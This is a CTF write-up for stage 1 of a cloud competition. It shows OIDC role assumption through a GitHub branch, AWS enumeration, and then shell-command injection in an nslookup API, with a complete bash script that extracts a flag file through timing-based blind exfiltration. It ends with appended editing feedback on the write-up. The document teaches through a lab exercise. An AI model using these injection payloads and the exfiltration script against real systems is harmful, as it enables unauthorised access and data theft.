
Hello to everyone.

Today I want to tell about my experience on the CTF Competition from MAFAT with name  CLOUD ESCAPE.

Competition has 3 stages.
1 and 2 for everybody and 3 for a best 20 persons.

I ended stage 1 and got stuck at the end of stage 2 but I think that I found a solution after ending of the competition.

So here is a Write-Up for the Stage 1 of this event.

After registration we get access for the 1 stage and get a short description and get 2 things:
1).git zip file 
2)User code like:000994****\

I downloaded a git folder and opened it with a git program for soft using and checking 

In the git history we see couple of commits and I found a couple that were interesting;
1)this is  a lambda_function.py 
2)policy file of aws.

a code we will use in the future but we start with the policy file.

in the file we see a line:
include a line of corgi
that says to us that we can get credentials to some aws if we make a request from some repo with the branch with name corgi.

I made a some test repo on github and made a first deploy.yml file to check if this works.
I made a request for AWS Credentials with a user that we got from the site with role of cicdRole that we found in the file of .git in the file xxxxxxx



    name: deploy

    on:
    push:
        branches:
        - corgi

    jobs:
    aws:
        runs-on: ubuntu-latest
        permissions:
        id-token: write

        steps:
        - name: Get AWS credentials
            uses: aws-actions/configure-aws-credentials@v4
            with:
            role-to-assume: arn:aws:iam::009661764077:role/cicdRole
            aws-region: us-east-1


and we get this output:

    Run aws-actions/configure-aws-credentials@v4
    with:
        role-to-assume: arn:aws:iam::009661764077:role/cicdRole
        aws-region: us-east-1
        audience: sts.amazonaws.com
        output-env-credentials: true
    Assuming role with OIDC
    Authenticated as assumedRoleId AROAQEP7C2HWZYKJGPIHM:GitHubActions

Okay, we are in it!

So now we can start a reconnaissance of the role and check what we have and what we can do?

    I start from basic commands:
    aws sts get-caller-identity
    aws s3 ls
    aws lambda list-functions

and this is a deploy file:

    name: deploy

    on:
    push:
        branches:
        - corgi

    jobs:
    aws:
        runs-on: ubuntu-latest
        permissions:
        id-token: write

        steps:
        - name: Get AWS credentials
            uses: aws-actions/configure-aws-credentials@v4
            with:
            role-to-assume: arn:aws:iam::009661764077:role/cicdRole
            aws-region: us-east-1


    - name: Verify AWS identity
            run: aws sts get-caller-identity

        - name: Test AWS permissions
            run: |
            aws s3 ls
            aws lambda list-functions
		  
And we get from here:		  
		  
    Run aws sts get-caller-identity
    aws sts get-caller-identity
    shell: /usr/bin/bash -e {0}
    env:
        AWS_DEFAULT_REGION: us-east-1
        AWS_REGION: us-east-1
        AWS_ACCESS_KEY_ID: ***
        AWS_SECRET_ACCESS_KEY: ***
        AWS_SESSION_TOKEN: ***
    {
        "UserId": "AROAQEP7C2HWZYKJGPIHM:GitHubActions",
        "Account": "009661764077",
        "Arn": "arn:aws:sts::009661764077:assumed-role/cicdRole/GitHubActions"
    }		  
    aws s3 ls
    aws lambda list-functions
    shell: /usr/bin/bash -e {0}
    env:
        AWS_DEFAULT_REGION: us-east-1
        AWS_REGION: us-east-1
        AWS_ACCESS_KEY_ID: ***
        AWS_SECRET_ACCESS_KEY: ***
        AWS_SESSION_TOKEN: ***
    2026-07-29 16:29:25 codec4f26c862a321ef5
    2026-07-29 16:29:26 platform-bucket-009661764077-us-east-1
    2026-07-29 16:29:25 site781fe43f26b9eba3
    {
        "Functions": [
            {
                "FunctionName": "nslookupv2",
                "FunctionArn": "arn:aws:lambda:us-east-1:009661764077:function:nslookupv2",
                "Runtime": "python3.13",
                "Role": "arn:aws:iam::009661764077:role/lambdaRole",
                "Handler": "lambda_function.lambda_handler",
                "CodeSize": 469,
                "Description": "",
                "Timeout": 15,
                "MemorySize": 512,
                "LastModified": "2026-07-29T16:29:44.127+0000",
                "CodeSha256": "CFvxHj1Tj/ZdUahrJE3buoQSfAn8b2ytHDicjIhAioI=",
                "Version": "$LATEST",
                "VpcConfig": {
                    "SubnetIds": [
                        "subnet-0d86c3129f4405706"
                    ],
                    "SecurityGroupIds": [
                        "sg-0de9d1a2c42a08a3e"
                    ],
                    "VpcId": "vpc-09328d3fa21dce320",
                    "Ipv6AllowedForDualStack": false
                },
                "TracingConfig": {
                    "Mode": "PassThrough"
                },
                "RevisionId": "f62901db-4565-46f5-ad29-480c2d13867c",
                "Layers": [
                    {
                        "Arn": "arn:aws:lambda:us-east-1:009661764077:layer:aws_cli_layer:8",
                        "CodeSize": 27364562
                    },
                    {
                        "Arn": "arn:aws:lambda:us-east-1:009661764077:layer:nslookup_layer:8",
                        "CodeSize": 4313595
                    }
                ],
                "PackageType": "Zip",
                "Architectures": [
                    "x86_64"
                ],
                "EphemeralStorage": {
                    "Size": 512
                },
                "SnapStart": {
                    "ApplyOn": "None",
                    "OptimizationStatus": "Off"
                },
                "LoggingConfig": {
                    "LogFormat": "Text",
                    "LogGroup": "/aws/lambda/nslookupv2"
                }
            }
        ]
    }

So, here we see couple of interesting things:
1-we have 3 buckets

    2026-07-29 16:29:25 codec4f26c862a321ef5
    2026-07-29 16:29:26 platform-bucket-009661764077-us-east-1
    2026-07-29 16:29:25 site781fe43f26b9eba3

2-we  have some function with name

    nslookupv2

    that run from the arn:aws:iam::009661764077:role/lambdaRole Role.
    that run on some vpc-host:vpc-09328d3fa21dce320

So now we go for the next step:

Check all Roles that we have with a:

    aws iam list-attached-role-policies \
                --role-name $ROLE
    aws iam list-role-policies \
                --role-name $ROLE


With this deploy:

    - name: Check IAM permissions
            run: |
            echo "===== ATTACHED ROLE POLICIES ====="

            ROLE=$(aws sts get-caller-identity --query Arn --output text | awk -F/ '{print $2}')

            aws iam list-attached-role-policies \
                --role-name $ROLE || true

            echo "===== INLINE POLICIES ====="

            aws iam list-role-policies \
                --role-name $ROLE || true

But this doesn't work and we get an ACCESS DENIED

Okay, now we made an enumeration of the S3 Buckets
With:

        aws s3api get-bucket-location \
              --bucket $bucket 

        aws s3api get-bucket-policy \
          --bucket $bucket 

        aws s3 ls s3://$bucket 

With this deploy:

    - name: Enumerate S3
            run: |
            echo "===== S3 BUCKETS ====="

            aws s3 ls

            echo "===== BUCKET DETAILS ====="

            for bucket in $(aws s3 ls | awk '{print $3}')
            do
                echo "### $bucket"

                aws s3api get-bucket-location \
                --bucket $bucket || true

                aws s3api get-bucket-policy \
                --bucket $bucket || true

                aws s3 ls s3://$bucket || true
            done
And we get:

===== S3 BUCKETS =====
2026-07-29 16:29:25 codec4f26c862a321ef5
2026-07-29 16:29:26 platform-bucket-009661764077-us-east-1
2026-07-29 16:29:25 site781fe43f26b9eba3
===== BUCKET DETAILS =====
### codec4f26c862a321ef5

aws: [ERROR]: An error occurred (AccessDenied) when calling the GetBucketLocation operation: User: arn:aws:sts::009661764077:assumed-role/cicdRole/GitHubActions is not authorized to perform: s3:GetBucketLocation on resource: "arn:aws:s3:::codec4f26c862a321ef5" because no identity-based policy allows the s3:GetBucketLocation action
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"LambdaReadAccess\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::009661764077:role/lambdaRole\"},\"Action\":[\"s3:GetObject\",\"s3:ListBucket\"],\"Resource\":[\"arn:aws:s3:::codec4f26c862a321ef5/*\",\"arn:aws:s3:::codec4f26c862a321ef5\"],\"Condition\":{\"StringEquals\":{\"aws:SourceVpc\":\"vpc-09328d3fa21dce320\"}}},{\"Sid\":\"ctfPlatformAccess\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::009661764077:role/CTFExecutionRole\"},\"Action\":[\"s3:GetObject\",\"s3:ListBucket\",\"s3:PutObject\"],\"Resource\":[\"arn:aws:s3:::codec4f26c862a321ef5/*\",\"arn:aws:s3:::codec4f26c862a321ef5\"]}]}"
}
2026-07-29 16:29:41        469 code.zip
2026-08-02 19:40:26         16 flag.txt
### platform-bucket-009661764077-us-east-1

aws: [ERROR]: An error occurred (AccessDenied) when calling the GetBucketLocation operation: User: arn:aws:sts::009661764077:assumed-role/cicdRole/GitHubActions is not authorized to perform: s3:GetBucketLocation on resource: "arn:aws:s3:::platform-bucket-009661764077-us-east-1" because no identity-based policy allows the s3:GetBucketLocation action
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::platform-bucket-009661764077-us-east-1/*\"}]}"
}
2026-08-02 13:23:05      33734 dotgit.zip
### site781fe43f26b9eba3

aws: [ERROR]: An error occurred (AccessDenied) when calling the GetBucketLocation operation: User: arn:aws:sts::009661764077:assumed-role/cicdRole/GitHubActions is not authorized to perform: s3:GetBucketLocation on resource: "arn:aws:s3:::site781fe43f26b9eba3" because no identity-based policy allows the s3:GetBucketLocation action
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"PolicyForCloudFrontPrivateContent\",\"Statement\":[{\"Sid\":\"AllowCloudFrontServicePrincipal\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"cloudfront.amazonaws.com\"},\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::site781fe43f26b9eba3/*\",\"Condition\":{\"StringEquals\":{\"AWS:SourceArn\":\"arn:aws:cloudfront::009661764077:distribution/EKD9KH16RB5G3\"}}}]}"
}
                           PRE css/
                           PRE images/
                           PRE js/
2026-07-29 16:33:33        738 index.html

Ouuuuuuu, what we see here:
On codec4f26c862a321ef5 we see a flag.txt is size of 16 byte and some code.zip. and we see that in Policy:
lambdaRole has a GetObject if a request is from the vpc-09328d3fa21dce320.

    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"LambdaReadAccess\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::009661764077:role/lambdaRole\"},\"Action\":[\"s3:GetObject\",\"s3:ListBucket\"],\"Resource\":[\"arn:aws:s3:::codec4f26c862a321ef5/*\",\"arn:aws:s3:::codec4f26c862a321ef5\"],\"Condition\":{\"StringEquals\":{\"aws:SourceVpc\":\"vpc-09328d3fa21dce320\"}}.

On platform-bucket-009661764077-us-east-1 we see a file that we get from the site of the competition:

    dotgit.zip

On site781fe43f26b9eba3 we see some file that looks like a site with some frontend interface. and in the Policy we see a  {\"Service\":\"cloudfront.amazonaws.com\"} that says that this is some website.

Okay, so now we have a little bit of understanding of what infrastructure we have here.

3 buckets, one for get a .git, one with a flag that we need and some code on it, and one with a website on the cloudfront service.


Now I want to get some more info about vpc environment because we know that to get a flag we need to be in vpc.

    - name: Check VPC information
        run: |
          echo "===== VPC ====="

          aws ec2 describe-vpcs

          echo "===== SECURITY GROUPS ====="

          aws ec2 describe-security-groups


And Output is:

    ===== VPC =====
    {
        "Vpcs": [
            {
                "OwnerId": "009661764077",
                "InstanceTenancy": "default",
                "CidrBlockAssociationSet": [
                    {
                        "AssociationId": "vpc-cidr-assoc-0bdded0275d32c953",
                        "CidrBlock": "10.0.0.0/16",
                        "CidrBlockState": {
                            "State": "associated"
                        }
                    }
                ],
                "IsDefault": false,
                "Tags": [
                    {
                        "Key": "Name",
                        "Value": "lambda_vpc"
                    }
                ],
                "BlockPublicAccessStates": {
                    "InternetGatewayBlockMode": "off"
                },
                "VpcId": "vpc-09328d3fa21dce320",
                "State": "available",
                "CidrBlock": "10.0.0.0/16",
                "DhcpOptionsId": "dopt-044e3064394b23825"
            },
            {
                "OwnerId": "009661764077",
                "InstanceTenancy": "default",
                "CidrBlockAssociationSet": [
                    {
                        "AssociationId": "vpc-cidr-assoc-0a7661e9cee22c59c",
                        "CidrBlock": "10.0.0.0/16",
                        "CidrBlockState": {
                            "State": "associated"
                        }
                    }
                ],
                "IsDefault": false,
                "Tags": [
                    {
                        "Key": "Name",
                        "Value": "codebuild_vpc"
                    }
                ],
                "BlockPublicAccessStates": {
                    "InternetGatewayBlockMode": "off"
                },
                "VpcId": "vpc-09d39837c916df970",
                "State": "available",
                "CidrBlock": "10.0.0.0/16",
                "DhcpOptionsId": "dopt-044e3064394b23825"
            }
        ]
    }
    ===== SECURITY GROUPS =====
    {
        "SecurityGroups": [
            {
                "GroupId": "sg-094f4cd1810de09de",
                "IpPermissionsEgress": [],
                "Tags": [
                    {
                        "Key": "Name",
                        "Value": "lambda_vpc-default"
                    }
                ],
                "VpcId": "vpc-09328d3fa21dce320",
                "SecurityGroupArn": "arn:aws:ec2:us-east-1:009661764077:security-group/sg-094f4cd1810de09de",
                "OwnerId": "009661764077",
                "GroupName": "default",
                "Description": "default VPC security group",
                "IpPermissions": []
            },
            {
                "GroupId": "sg-0afb2fb6a12085ce6",
                "IpPermissionsEgress": [],
                "Tags": [
                    {
                        "Key": "Name",
                        "Value": "codebuild_vpc-default"
                    }
                ],
                "VpcId": "vpc-09d39837c916df970",
                "SecurityGroupArn": "arn:aws:ec2:us-east-1:009661764077:security-group/sg-0afb2fb6a12085ce6",
                "OwnerId": "009661764077",
                "GroupName": "default",
                "Description": "default VPC security group",
                "IpPermissions": []
            },
            {
                "GroupId": "sg-0de9d1a2c42a08a3e",
                "IpPermissionsEgress": [
                    {
                        "IpProtocol": "tcp",
                        "FromPort": 443,
                        "ToPort": 443,
                        "UserIdGroupPairs": [],
                        "IpRanges": [],
                        "Ipv6Ranges": [],
                        "PrefixListIds": [
                            {
                                "Description": "HTTPS",
                                "PrefixListId": "pl-63a5400a"
                            }
                        ]
                    }
                ],
                "Tags": [
                    {
                        "Key": "Name",
                        "Value": "lambda_sg"
                    }
                ],
                "VpcId": "vpc-09328d3fa21dce320",
                "SecurityGroupArn": "arn:aws:ec2:us-east-1:009661764077:security-group/sg-0de9d1a2c42a08a3e",
                "OwnerId": "009661764077",
                "GroupName": "lambda_sg-20260729162940678600000007",
                "Description": "Security Group managed by Terraform",
                "IpPermissions": []
            }
        ]
    }


From this VPC output we can see:

1. **Two VPCs exist**: `lambda_vpc` (vpc-09328d3fa21dce320) and `codebuild_vpc` (vpc-09d39837c916df970), both with CIDR block 10.0.0.0/16
2. **Lambda VPC is the key**: The lambda function we found earlier runs in lambda_vpc (vpc-09328d3fa21dce320)

This means: to get the flag from the S3 bucket, we need to somehow execute code **inside the Lambda function** (which runs in that specific VPC) rather than trying to access it from outside.

And now we know that we have some site that runs a CloudFront.


    - name: CloudFront discovery
            run: |
            echo "===== CLOUDFRONT ====="
            aws cloudfront list-distributions || true
            
            
		  
		  
Output:	  
		  
    ===== CLOUDFRONT =====
    {
        "DistributionList": {
            "Items": [
                {
                    "Id": "EKD9KH16RB5G3",
                    "ARN": "arn:aws:cloudfront::009661764077:distribution/EKD9KH16RB5G3",
                    "ETag": "E23ZP02F085DFQ",
                    "Status": "Deployed",
                    "LastModifiedTime": "2026-07-29T16:29:28.290000+00:00",
                    "DomainName": "d67nf28gqfurd.cloudfront.net",
                    "Aliases": {
                        "Quantity": 0
                    },
                    "Origins": {
                        "Quantity": 1,
                        "Items": [
                            {
                                "Id": "s3_oac",
                                "DomainName": "site781fe43f26b9eba3.s3.us-east-1.amazonaws.com",
                                "OriginPath": "",
                                "CustomHeaders": {
                                    "Quantity": 0
                                },
                                "S3OriginConfig": {
                                    "OriginAccessIdentity": "",
                                    "OriginReadTimeout": 30
                                },
                                "ConnectionAttempts": 3,
                                "ConnectionTimeout": 10,
                                "OriginShield": {
                                    "Enabled": false
                                },
                                "OriginAccessControlId": "E1UOO8R317GEA1"
                            }
                        ]
                    },
                    "OriginGroups": {
                        "Quantity": 0
                    },
                    "DefaultCacheBehavior": {
                        "TargetOriginId": "s3_oac",
                        "TrustedSigners": {
                            "Enabled": false,
                            "Quantity": 0
                        },
                        "TrustedKeyGroups": {
                            "Enabled": false,
                            "Quantity": 0
                        },
                        "ViewerProtocolPolicy": "allow-all",
                        "AllowedMethods": {
                            "Quantity": 3,
                            "Items": [
                                "HEAD",
                                "GET",
                                "OPTIONS"
                            ],
                            "CachedMethods": {
                                "Quantity": 2,
                                "Items": [
                                    "HEAD",
                                    "GET"
                                ]
                            }
                        },
                        "SmoothStreaming": false,
                        "Compress": false,
                        "LambdaFunctionAssociations": {
                            "Quantity": 0
                        },
                        "FunctionAssociations": {
                            "Quantity": 0
                        },
                        "FieldLevelEncryptionId": "",
                        "CachePolicyId": "4135ea2d-6df8-44a3-9df3-4b5a84be39ad",
                        "GrpcConfig": {
                            "Enabled": false
                        }
                    },
                    "CacheBehaviors": {
                        "Quantity": 0
                    },
                    "CustomErrorResponses": {
                        "Quantity": 0
                    },
                    "Comment": "CloudFront distribution for S3 bucket.",
                    "PriceClass": "PriceClass_100",
                    "Enabled": true,
                    "ViewerCertificate": {
                        "CloudFrontDefaultCertificate": true,
                        "SSLSupportMethod": "vip",
                        "MinimumProtocolVersion": "TLSv1",
                        "CertificateSource": "cloudfront"
                    },
                    "Restrictions": {
                        "GeoRestriction": {
                            "RestrictionType": "whitelist",
                            "Quantity": 1,
                            "Items": [
                                "IL"
                            ]
                        }
                    },
                    "WebACLId": "arn:aws:wafv2:us-east-1:009661764077:global/webacl/cloudfront-waf/9e7d5a49-e381-4d96-883b-a01ea6d5d18e",
                    "HttpVersion": "HTTP2",
                    "IsIPV6Enabled": false,
                    "Staging": false,
                    "ConnectionMode": "direct"
                }
            ]
        }
    }

Okay we find some domain:
"DomainName": "d67nf28gqfurd.cloudfront.net"
Now we will make a check what is this domain.
We PUT it to the browser:

    https://d67nf28gqfurd.cloudfront.net

and get some FrontEnd page with Header of NSLOOKUP.
Like this(I didn't make a printscreen so AI helped to make something like a page that was in test):
![alt text](image.png)
That gets some request in the line and makes something.
We try to write something and we get an Output of:

    ip_address": "wip",
    "domain": "wip"
Weird, in the code of the lambda we saw that it needs to make a nslookup command with a variable that we get from the function and it returns an output.

Let's explore more.

 We go to the Source code of the page and we see some JAVA.SCRIPT code.
Open it and see that it makes a request for the api hand of:

    https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup

Okay , we can now make a direct request for a API hand and get a direct Output.

Let's try with some curl command:

    curl -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
      -H "Content-Type: application/json" \
      -d '{"domain":"8.8.8.8"}'

And this is the output that we get:

    {
    "body" : {
        "ip_address": "wip",
        "domain": "wip",
        "timestamp": "02/Aug/2026:20:59:01 +0000"
    }
    }

I try a couple of times with different input. But each time I get the same Output.
I try to make some executable commands with && or ; to try to get more info but get the same WIP output.


So I think about another way to get an acknowledgment that the commands that I send are really working.

So basic check is send a ; sleep 5 and check a time of response and check with ;sleep 10.

Here's a bash script to test timing differences:

    #!/bin/bash
    URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
    
    echo "Testing with sleep 5..."
    time curl -s -X POST "$URL" \
      -H "Content-Type: application/json" \
      -d '{"domain":"x; sleep 5"}' > /dev/null
    
    echo "Testing with sleep 10..."
    time curl -s -X POST "$URL" \
      -H "Content-Type: application/json" \
      -d '{"domain":"x; sleep 10"}' > /dev/null

Yes! We see that sleep is working.

So for now we understand that we have an output only with the time of response.

Soooooo. What can we do?

How can the time of the response transmit data? It can.

This can be a tool of boolean like:

    If somethink==somethink:
        sleep 5
    else:
        sleep 10

or more if-elseif.

So I started to check if I can read a flag.txt and if yes I get a sleep of 5 second and if not sleep 10.

and I get a response in the 5.5 seconds. that means that we can read a flag.

but how do we transport an output of the cat flag.txt to me?

Check if each characters form the 16 byte = to some characters and if yes it made a short sleep?

This is a 127 options of ASCII * 16 = 2032 checking of the flag data in maximum and if each one is like 10 seconds this is a: 338 minutes or 5:30+- hours.
Bad....

Or we can do something more interesting. Binary Search. To check if a Character is bigger than the center of the maximum value(127) we take 65, and if not we start to check from the center on the opposite side of the checking(if we checked that it is bigger than 65 and it is not, we go to the smaller side and check if it is now bigger than 32 and if not bigger than 16 and ...)
so after that we have only 7 checking steps for each byte. that means that the maximum time is now 18.6 minutes at most.

Okay, we start to checking with this code that we run on local pc that made an auto api request and binary check with the sleep time difference.

    #!/usr/bin/env bash
    # timing_exfil.sh v5 - dynamic threshold based on measured baseline

    CURL=/usr/bin/curl
    URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
    FLAG_PATH="s3://codec4f26c862a321ef5/flag.txt"
    AWS_BIN="/opt/aws"
    SLEEP_SIGNAL=5   # sleep 5s when byte > mid (baseline ~5.5s, total ~10.5s < 15s timeout)
    FLAG_LEN=16

    fire() {
    local domain="$1"
    local payload
    payload=$(python3 -c "import json,sys; print(json.dumps({'domain':sys.argv[1]}))" "$domain")
    local START END
    START=$(date +%s%3N)
    $CURL -s -X POST "$URL" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        --max-time 20 > /dev/null
    END=$(date +%s%3N)
    echo $(( END - START ))
    }

    echo "===== STEP 1: Measure baseline (no sleep) ====="
    echo "Running 3 baseline requests to get stable timing..."
    TOTAL=0
    for i in 1 2 3; do
    T=$(fire "x; ${AWS_BIN} s3 cp ${FLAG_PATH} /tmp/f 2>/dev/null; b=\$(dd if=/tmp/f bs=1 skip=0 count=1 2>/dev/null | od -An -tu1 | tr -dc 0-9); echo done")
    echo "  baseline run $i: ${T}ms"
    TOTAL=$(( TOTAL + T ))
    done
    BASELINE=$(( TOTAL / 3 ))
    THRESHOLD=$(( BASELINE + 2500 ))  # threshold = baseline + 2.5 second margin
    echo "Baseline avg: ${BASELINE}ms"
    echo "Threshold set to: ${THRESHOLD}ms"
    echo "With sleep ${SLEEP_SIGNAL}s: expect ~$((BASELINE + SLEEP_SIGNAL * 1000))ms (must be < 15000ms)"

    if (( BASELINE + SLEEP_SIGNAL * 1000 >= 14500 )); then
    echo "WARNING: sleep+baseline too close to lambda timeout, reducing sleep..."
    SLEEP_SIGNAL=3
    echo "Sleep reduced to ${SLEEP_SIGNAL}s, with-sleep estimate: $((BASELINE + SLEEP_SIGNAL * 1000))ms"
    fi

    echo ""
    echo "===== STEP 2: Binary search extraction ====="
    FLAG_BYTES=()

    for (( pos=0; pos<FLAG_LEN; pos++ )); do
    echo ""
    echo "----- Byte $pos -----"
    lo=32   # printable ASCII start
    hi=126  # printable ASCII end

    while (( lo < hi )); do
        mid=$(( (lo + hi) / 2 ))
        T=$(fire "x; ${AWS_BIN} s3 cp ${FLAG_PATH} /tmp/f 2>/dev/null; b=\$(dd if=/tmp/f bs=1 skip=${pos} count=1 2>/dev/null | od -An -tu1 | tr -dc 0-9); (( b > ${mid} )) && sleep ${SLEEP_SIGNAL}")

        if (( T > THRESHOLD )); then
        lo=$(( mid + 1 ))
        echo "  mid=$mid ${T}ms > ${THRESHOLD} → byte > $mid → lo=$lo"
        else
        hi=$mid
        echo "  mid=$mid ${T}ms ≤ ${THRESHOLD} → byte ≤ $mid → hi=$hi"
        fi
    done

    FLAG_BYTES+=($lo)
    CHAR=$(printf "\\$(printf '%03o' "$lo")")
    echo "  → byte[$pos] = $lo ('$CHAR')"
    printf "  Partial: "
    for b in "${FLAG_BYTES[@]}"; do
        printf "\\$(printf '%03o' "$b")"
    done
    echo ""
    done

    echo ""
    echo "=================================================="
    printf "FLAG: "
    for b in "${FLAG_BYTES[@]}"; do
    printf "\\$(printf '%03o' "$b")"
    done
    echo ""



and after 15 minutes I get a FLLLLLLAGGGG!
I put it to the site and go to the second stage of competition.

See a Write-Up of the Competition Here:xxxxxxxx





Line 461-466 — Partial VPC explanation

Currently has basic bullet points but missing key context about:
Security Group detailed analysis (why the lambda_sg is important)
Connection to the binary search exploit methodology
The explanation cuts off abruptly after point 2
Line 25-26 — Description of corgi branch reference

Says "include a line of corgi" — should clarify what specific line/content in the policy file or git config shows this
Line 602-604 — Screenshot/image description

References ![alt text](image.png) but the actual image is missing and needs description of what the NSLOOKUP frontend looks like
Line 20 — Lambda function code not shown

Mentions "lambda_function.py" was found but the actual Python code is never displayed or explained
Should show what the function does
No summary/recap section at end

The writeup ends abruptly at line 783 after completing the exploit
Missing: conclusion about the technique used, key learnings, or bridge to Stage 2
Minor detail on line 17 — "git program for soft using and checking"

Should specify which program (GitHub Desktop, GitKraken, etc.) or clarify if this is just describing the general process
Missing explanation of the Layers (lines 163-171)

The output shows Lambda Layers (aws_cli_layer, nslookup_layer) but never explains why these are important or what they enable